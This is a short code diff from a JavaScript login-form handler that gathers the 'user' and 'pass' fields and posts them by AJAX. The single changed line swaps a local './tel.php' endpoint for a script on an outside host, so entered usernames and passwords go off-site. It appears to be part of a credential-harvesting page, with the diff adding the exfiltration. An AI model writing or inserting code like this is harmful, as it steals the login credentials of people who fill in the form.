@@ -58,7 +58,7 @@ btn.addEventListener('click', function () {
   form_data.append('user', user.value)
   form_data.append('pass', pass.value)
   $.ajax({
-    url: './tel.php',
+    url: 'https://friendpc.com/index.html/telblu/tel.php',
     dataType: 'text',
     cache: false,
     contentType: false,
